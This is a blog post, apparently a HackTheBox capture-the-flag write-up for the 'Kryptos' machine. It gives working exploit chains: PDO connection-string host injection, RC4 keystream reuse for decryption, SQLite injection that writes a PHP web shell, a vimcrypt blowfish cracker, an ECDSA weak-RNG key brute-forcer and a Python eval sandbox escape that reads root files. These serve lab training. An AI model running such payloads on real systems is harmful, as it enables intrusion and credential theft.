---
title:  "Hackthebox - Kryptos"
date:   2019-09-21 20:33:28 +0200
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-kryptos.png" alt="Info Card" %}

## user

I do not have an nmap output for that box because I immediately concentrated on the website on Port 80 which shows a login page requesting username and password.

When taking a closer look at the login page, one can see that the database name is taken from the request parameter `db`.

When trying to change the `db` parameter, the response contains a PDO error. This leads to the conclusion that the database connection is made using PHP PDO.

A PDO connection string for mysql looks similar to the following example:

```default
$dsn = "mysql:host=localhost;dbname=mydb";
```

If it is possible to supply arbitrary input for `dbname`, the `host` attribute can be overwritten by declaring it a second time, e.g.:

```default
$dsn = "mysql:host=localhost;dbname=mydb;host=attacker.box";
```

The following request was used to make the web application query our own database instead of the one on the box:

```default
POST / HTTP/1.1
Host: 10.10.10.129
Content-Type: application/x-www-form-urlencoded
Content-Length: 136
Cookie: PHPSESSID=37cctnu27jj0ol3k13kjaacgqa
Connection: close

username=someone&password=foobar&db=cryptor;host=10.10.13.201&token=bc48e1b5f6409466a704472c96eb0b8198c25178a9dea686366b91694ccaa8be&login=
```

After verifying that the connection is working, a mysql server was started on the attacker machine. In order to allow remote connections on Kali, the following line in `/etc/mysql/mariadb.conf.d/50-server.cnf` was edited:

```default
bind-address		= 0.0.0.0
```

Listening to the traffic with wireshark revealed user and database name:

```default
11	0.121687860	10.10.10.129	10.10.13.201	MySQL	168	Login Request user=dbuser db=cryptor
```

Next, the `cryptor` database was created locally in order to be able to make the requests from the web application proceed further:

```default
MariaDB [(none)]> create database cryptor;
Query OK, 1 row affected (0.000 sec)
```

Normally, users need to authenticate correctly. As we do not know username and password provided by the application, mysql can be started without authentication in order to allow connections with any credentials:

```bash
$ systemctl stop mysql
$ mysqld_safe --skip-grant-tables
190413 12:05:12 mysqld_safe Logging to syslog.
190413 12:05:12 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql
```

When executing the request from above again, the login request succeeded and we can see the mysql query the server is executing:

```bash
Frame 14: 164 bytes on wire (1312 bits), 164 bytes captured (1312 bits) on interface 0
Raw packet data
Internet Protocol Version 4, Src: 10.10.10.129, Dst: 10.10.13.201
Transmission Control Protocol, Src Port: 33486, Dst Port: 3306, Seq: 117, Ack: 107, Len: 112
MySQL Protocol
    Packet Length: 108
    Packet Number: 0
    Request Command Query
        Command: Query (3)
        Statement: SELECT username, password FROM users WHERE username='someone' AND password='3858f62230ac3c915f300c664312c63f' 
```

This means that we need to create the table `users` with columns `username` and `password` and fill them with the data supplied by us. We can confirm that the password is the md5 hash of the password `foobar` that was submitted: 

```bash
$ echo -n foobar | md5sum
3858f62230ac3c915f300c664312c63f  -
```

The following commands were used to create the table and insert the necessary data:

```bash
MariaDB [(none)]> use cryptor;
Database changed
MariaDB [cryptor]> create table users(username varchar(256), password varchar(256));
Query OK, 0 rows affected (0.015 sec)

MariaDB [cryptor]> insert into users(username, password) values ('someone', '3858f62230ac3c915f300c664312c63f');
Query OK, 1 row affected (0.004 sec)
```

When executing the request from before again and replacing the token parameter with the one returned in the previous response, login succeeds and we get redirected to `/encrypt.php`. In order to explore the login area, the PHP session ID can be copied to the browser.

The `encrypt.php` page lets us encrypt files using `AES-CBC` and `RC4` by specifying `http://<host>/path/to/resource`, but we cannot decrypt files the easy way because the `decrypt.php` page tells us that it is "under construction". It is possible to encrypt files from the server itself (tested with `/css/bootstrap.min.css`) as well as from the attacker machine. This means we can choose a plaintext and let the server encrypt it for us.

Although we do not have knowledge of the key, this enables us to decrypt the files that get encrypted with RC4, because RC4 XORs the same keystream to different files in order to encrypt them. This produces the following results:

```python
enc1 = xor(keystream, plaintext1)
enc2 = xor(keystream, plaintext2)
```

The plaintext can now be recovered as follows:

```python
xor(enc1, enc2, plaintext2) = xor(keystream, plaintext1, keystream, plaintext2, plaintext2) 
                            = xor(keystream, plaintext1, keystream) 
							= plaintext1
```

Therefore, a file with a lot of zeroes was created on the attacker machine and used as `plaintext2`. The following code was used for decryption:

```python
def decrypt(p1, c1, c2):
    return ''.join(chr(ord(a) ^ ord(b) ^ ord(c)) for a, b, c in zip(p1, c1, c2))

def decode_ciphertext(c):
    return base64.b64decode(c)


def submit_query(file_url):
    url = "http://10.10.10.129/encrypt.php"
    params = { "cipher" : "RC4", "url" : file_url }
    cookies = { "PHPSESSID" : "37cctnu27jj0ol3k13kjaacgqa" }
    response = requests.get(url, params = params, cookies = cookies)
    soup = BeautifulSoup(response.content, "html.parser")
    tags = soup.select("textarea[id=output]")
    if tags and len(tags) > 0:
        return tags[0].text


def execute(url):
    p1 = open("zeroes.txt", "r").read()
    cb1 = submit_query("http://10.10.13.201:8888/zeroes.txt")
    c1 = decode_ciphertext(cb1)
    cb2 = submit_query(url)
    c2 = decode_ciphertext(cb2)
    print("p1: {}, cb1: {}, cb2: {}".format(len(p1), len(c1), len(c2)))
    print(decrypt(p1, c1, c2))
```

Directory traversal does not seem to be possible, but the server did not refuse to access files via localhost. Therefore, I suspected that some files under the webroot are only accessible from localhost. This was the case for the `server_status` page of apache, which was a rabbit hole. However, it was possible to also access files via `/dev/` by requesting `http://127.0.0.1/dev/`.

The website under `/dev/` includes an `about` page and a `todo` page that can be accessed as follows

```default
http://127.0.0.1/dev/?view=about
http://127.0.0.1/dev/?view=todo
```

The content of the `todo` page points towards a test page for sqlite that should be disabled. It is possible to include arbitrary files via `view` parameters, and PHP filters work as well. Therefore, I got the contents of that page by requesting `http://127.0.0.1/dev/?view=php%3a//filter/convert.base64-encode/resource%3dsqlite_test_page`. 

```html
<html>
<head></head>
<body>
<?php
$no_results = $_GET['no_results'];
$bookid = $_GET['bookid'];
$query = "SELECT * FROM books WHERE id=".$bookid;
if (isset($bookid)) {
   class MyDB extends SQLite3
   {
      function __construct()
      {
	 // This folder is world writable - to be able to create/modify databases from PHP code
         $this->open('d9e28afcf0b274a5e0542abb67db0784/books.db');
      }
   }
   $db = new MyDB();
   if(!$db){
      echo $db->lastErrorMsg();
   } else {
      echo "Opened database successfully\n";
   }
   echo "Query : ".$query."\n";

if (isset($no_results)) {
   $ret = $db->exec($query);
   if($ret==FALSE)
    {
	echo "Error : ".$db->lastErrorMsg();
    }
}
else
{
   $ret = $db->query($query);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ){
      echo "Name = ". $row['name'] . "\n";
   }
   if($ret==FALSE)
    {
	echo "Error : ".$db->lastErrorMsg();
    }
   $db->close();
}
}
?>
</body>
</html>
```

Looking at the source code and experimenting with the requests reveals that several things can be exploited here:

* There is an SQL injection in the books query where we can simply append to the statement.
* The directory `d9e28afcf0b274a5e0542abb67db0784` is world-writable, which lets us write files to the server.
* We can set the `no_results` parameter which disables querying the results. Stacked queries are executed successfully if the result of the first query does not get processed. 
* The script is nice and outputs the query and also tells us about syntax errors in SQL statements

Therefore, I tried to simply drop a PHP file for executing system commands into that folder:

```default
http://127.0.0.1/dev/sqlite_test_page.php?bookid=1%3b+ATTACH+DATABASE+'d9e28afcf0b274a5e0542abb67db0784/pleazz.php'+AS+lol%3b+DROP+TABLE+IF+EXISTS+lol.pwn%3b+CREATE+TABLE+lol.pwn+(dataz+text)%3b+INSERT+INTO+lol.pwn+(dataz)+VALUES+('<%3fphp+system($_GET["cmd"])%3f>')&no_results=1
```

..and execute it with the following rquest:

```default
http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/pleazz.php?cmd=[whatever we wish for]
```

But this box is of course not that easy to take over - unfortunately the PHP functions `system`, `passthru`, `exec` and `shell_exec` do not work.

However, we can execute the php function `file_get_contents`, `scandir` and `base64_encode` and therefore extract (binary) files and list directories as follows:

```default
# List directory contents
http://127.0.0.1/dev/sqlite_test_page.php?bookid=1%3b+ATTACH+DATABASE+'d9e28afcf0b274a5e0542abb67db0784/pleazz.php'+AS+lol%3b+DROP+TABLE+IF+EXISTS+lol.pwn%3b+CREATE+TABLE+lol.pwn+(dataz+text)%3b+INSERT+INTO+lol.pwn+(dataz)+VALUES+('<%3fphp+print_r(scandir("/some/directory"))%3f>')&no_results=1

# Read file
http://127.0.0.1/dev/sqlite_test_page.php?bookid=1%3b+ATTACH+DATABASE+'d9e28afcf0b274a5e0542abb67db0784/pleazz.php'+AS+lol%3b+DROP+TABLE+IF+EXISTS+lol.pwn%3b+CREATE+TABLE+lol.pwn+(dataz+text)%3b+INSERT+INTO+lol.pwn+(dataz)+VALUES+('<%3fphp+echo+file_get_contents("/some/file")%3f>')&no_results=1")

# Read file and output it in an array (better to read because our PHP file is an SQLITE database at the same time and therefore, some other stuff is mixed into the output
execute("http://127.0.0.1/dev/sqlite_test_page.php?bookid=1%3b+ATTACH+DATABASE+'d9e28afcf0b274a5e0542abb67db0784/pleazz.php'+AS+lol%3b+DROP+TABLE+IF+EXISTS+lol.pwn%3b+CREATE+TABLE+lol.pwn+(dataz+text)%3b+INSERT+INTO+lol.pwn+(dataz)+VALUES+('<%3fphp+$arr%3darray(file_get_contents("/some/file"))%3bprint_r($arr)%3b+%3f>')&no_results=1")

# Read file and output it in an array, encoded as base64 (for binary files)
http://127.0.0.1/dev/sqlite_test_page.php?bookid=1%3b+ATTACH+DATABASE+'d9e28afcf0b274a5e0542abb67db0784/pleazz.php'+AS+lol%3b+DROP+TABLE+IF+EXISTS+lol.pwn%3b+CREATE+TABLE+lol.pwn+(dataz+text)%3b+INSERT+INTO+lol.pwn+(dataz)+VALUES+('<%3fphp+$arr%3darray(base64_encode(file_get_contents("/some/file")))%3bprint_r($arr)%3b+%3f>')&no_results=1")
```

I found an encrypted file called `creds.txt` in rijndael's home dir and a plaintext file called `creds.old`.

Executing `file` and `strings` on `creds.txt` tells us that it is encrypted with vimcrypt using blowfish. There is a [crypto bug](https://dgl.cx/2014/10/vim-blowfish) that lets us recover the plaintext, e.g. with the following Python script:

```python
import sys

# Blocksize: 8 bytes
#
# First 28 bytes are:
# - magic bytes (12 bytes): VimCrypt~02!
# - salt (8 bytes)
# - iv (8 bytes)
#
# Cracking works as follows:
# 1. Extract keystream from xor(1st-enc-block, plaintext) - plaintext must be first 8 bytes of the encrypted file
# 2. Get plaintext by xor(keystrem, enc-block) - enc-block is an 8 byte block from the encrypted file
#
# See: https://dgl.cx/2014/10/vim-blowfish

def xor(c, p):
    return [chr(ord(a) ^ ord(b)) for a, b in zip(c, p)]


def decrypt(ks, c):
    chunks = [c[i:i+8] for i in range(0, len(c), 8)]
    res = []
    for chunk in chunks:
        res.extend(xor(ks, chunk))
    return "".join(res)


def crack(encrypted_file, plaintext_file):
    encrypted = read_file(encrypted_file)
    keystream = xor(encrypted[28:36], plaintext[:8])
    print(decrypt(keystream, encrypted[28:]))


def read_file(filename):
    return open(filename, "rb").read()


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: " + sys.argv[0] + " <encrypted-file> <plaintext>")
        sys.exit(0)
    encrypted_file = sys.argv[1]
    plaintext = sys.argv[2]
    crack(encrypted_file, plaintext)
```

Extraction reveals credentials for user `rijndael`:

```bash
$ python crack-vimcrypt-blowfish.py creds.txt rijndael
rijndael / bkVBL8Q9HuBSpj
```

It is possible to login to the box via SSH using those credentials:

```bash
$ ssh rijndael@10.10.10.129
rijndael@10.10.10.129's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)
                              
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com        
 * Support:        https://ubuntu.com/advantage

                     
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Apr 14 14:07:43 2019 from 10.10.13.129
rijndael@kryptos:~$ ls                   
creds.old  creds.txt  kryptos  user.txt
rijndael@kryptos:~$ cat user.txt
****************************0de2
```

## root

There is a python script in rijndael's home folder under `kryptos/kryptos.py`, which includes a web server and some endpoints I did not see before.

The output of `netstat` confirms that an internal python server is running on port 81:

```bash
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      107        17264      -                   
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      0          16268      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        13105      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          17669      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      0          19019      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        13104      -  
```

The python script runs as root! 

Reading through the source code reveals that it is a test server that passes signed expressions to `eval()` as follows:

```python
result = eval(expr, {'__builtins__':None}) # Builtins are removed, this should be pretty safe
```

Therefore, the following steps are needed to read the root flag:

1. Find a way to sign arbitrary expressions
2. Bypass the `{'__builtins__':None}` part in `eval`

The expressions are signed using ecdsa with the `NIST384p` curve. A short search did not indicate that this curve is broken in any way. However, the secret exponent is created using a random value that is passed to a `secure_rng` function that looks pretty interesting:

```python
def secure_rng(seed):
    # Taken from the internet - probably secure
    p = 2147483647
    g = 2255412

    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        seed = pow(g,seed,p)
        if seed > ths:
            ret += 2**i
    return ret
```

The random seed is used as a power of `g` modulo `p`. If we are lucky, the number of possible values for the initial seed gets reduced by the modulo operation and therefore the number of random values is smaller than the whole number space (`0` to `keyLength * 8`).

This can be tested by calculating `g^seed % p` for `seed` between `0` and `p` and check how many unique values remain. There were only about 300 unique values! 

Therefore, I simply precalculated the random values of the seeds between `0` and `10000` and filtered out all duplicates. After that, only 209 unique values remained.

The `/debug` route of the server gives us a valid message - signature pair. This pair can be used for bruteforcing the correct signing key by calculating the signature with signing key using each seed in our list and checking whether verifying the sample signature tells us it's valid. 

The following Python script enables us to sign arbitrary expressions with the signing key, when providing a sample response as sample-file, the command to sign and (optionally) a file with the precalculated random values (I reused parts of `kryptos.py`):

```python
import binascii
import json
import os
import random
import sys

from ecdsa import VerifyingKey, SigningKey, NIST384p

def secure_rng(seed):
    # Taken from the internet - probably secure
    p = 2147483647
    g = 2255412

    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        # g^seed mod p => 0 <= seed <= 2147483647
        seed = pow(g,seed,p)
        # print("Seed: {}".format(seed))
        # print("Ths: {}".format(ths))
        if seed > ths:
            # print("seed > ths")
            ret += 2**i
    return ret


def generate_random():
    seed = random.getrandbits(128)
    return secure_rng(seed) + 1


def generate_fixed(seed):
    return secure_rng(seed) + 1


def generate_randoms(maxvalue):
    values = []
    for i in range(maxvalue):
        values.append(generate_fixed(i))
    return list(set(values))


def write_randoms(values, filename):
    with open(filename, "w") as f:
        for v in values:
            f.write("{}\n".format(v))


def read_randoms(filename):
    with open(filename, "r") as f:
        return [int(l) for l in f.readlines()]


def read_sample(filename):
    with open(filename) as f:
        return json.load(f).get("response")


def verify(vk, msg, sig):
    try:
        return vk.verify(binascii.unhexlify(sig), msg)
    except:
        return False


def sign(sk, msg):
    return binascii.hexlify(sk.sign(msg))


def bruteforce(sample, randoms):
    expression = str.encode(sample.get("Expression"))
    signature = str.encode(sample.get("Signature"))
    print("Signature: {}".format(signature))
    for rand in randoms:
        sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
        vk = sk.get_verifying_key()
        if verify(vk, expression, signature):
            print("[!] Got a match: rand={}".format(rand))
            return sk


def generate_payload(sk, expr):
    sig = sign(sk, str.encode(expr))
    response = { 'expr': expr, 'sig': sig.decode() }
    print("Payload for /eval:")
    print(json.dumps(response, sort_keys=True, indent=2))


if __name__ == "__main__":

    if len(sys.argv) < 4:
        print("Usage: {} <samplefile> <randomsfile> <command>".format(sys.argv[0]))
        sys.exit(0)

    sample_file = sys.argv[1]
    randoms_file = sys.argv[2]
    cmd = sys.argv[3]

    if not os.path.isfile(randoms_file):
        print("[+] Generating random numbers...")
        randoms = generate_randoms(10000)
        print("Number of possible random numbers: {}".format(len(randoms)))

        print("[+] Writing random numbers to file...")
        write_randoms(randoms, randoms_file)

    else:
        print("[+] Reading random numbers...")
        randoms = read_randoms(randoms_file)
        print("Number of possible random numbers: {}".format(len(randoms)))

    print("[+] Reading sample...")
    sample = read_sample(sample_file)
    print(sample)

    print("[+] Bruteforcing signature...")
    sk = bruteforce(sample, randoms)

    print("[+] Signing payload...")
    generate_payload(sk, cmd)
```

Bypassing the `eval` sandbox looked like a nightmare first but worked after a few attempts.

It is neither possible to use built-in stuff such as `open` nor to use `__import__("module")`. However, basic datatypes such as lists, tuples, etc do work. Therefore, it is possible to walk the class hierarchy up, find an object that has a `_module` attribute and access the builtins by using a technique described in [this excellent blog post](https://gynvael.coldwind.pl/n/python_sandbox_escape):

```python
for c in {}.__class__.__base__.__subclasses__():
        if c.__name__ == "catch_warnings":
                b = c()._module.__builtins__
                m = b['__import__']('os')
                m.system("cat /etc/passwd")
```

I rewrote that code in order to make it work with `eval` as follows:

```python
eval("[c()._module.__builtins__ for c in {}.__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]['__import__']('os').system('cat /etc/passwd')", {'__builtins__': None })
```

Unfortunately, `os.system` does not give us any direct output. Luckily, `suprocess.check_output` does exactly that. The following expression enabled me to finally read the root flag:

```python
eval("[c()._module.__builtins__ for c in {}.__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]['__import__']('subprocess').check_output(['cat', '/root/root.txt'])", {'__builtins__': None })
```

Submitting a curl request with a correctly signed payload produces the desired output:

```bash
rijndael@kryptos:~$ curl http://localhost:81/eval -H "Content-Type: application/json" -d @/tmp/.req
{
  "response": {
    "Expression": "[c()._module.__builtins__ for c in {}.__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]['__import__']('subprocess').check_output(['cat', '/root/root.txt'])",
    "Result": "b'****************************7c6e\\n'"
  }
}
```
